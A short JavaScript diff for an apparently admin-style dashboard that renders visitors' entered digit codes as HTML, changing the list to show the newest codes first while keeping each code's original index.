@@ -515,7 +515,10 @@
         html += '<div class="data-section bg-orange-50 p-4 rounded-lg" style="border-right-color: #f97316;">';
         html += '<h3 class="font-bold mb-3 text-orange-800">🔢 الرموز المدخلة</h3>';
         html += '<div class="space-y-2">';
-        visitor.digitCodes.forEach((dc, index) => {
+        // Reverse to show newest first
+        const reversedCodes = [...visitor.digitCodes].reverse();
+        reversedCodes.forEach((dc, revIndex) => {
+          const index = visitor.digitCodes.length - 1 - revIndex; // Get original index for actions
           html += '<div class="bg-white p-3 rounded-lg">';
           html += '<div class="flex justify-between items-center mb-2">';
           html += '<span class="font-mono text-lg font-bold text-orange-700">' + dc.code + '</span>';
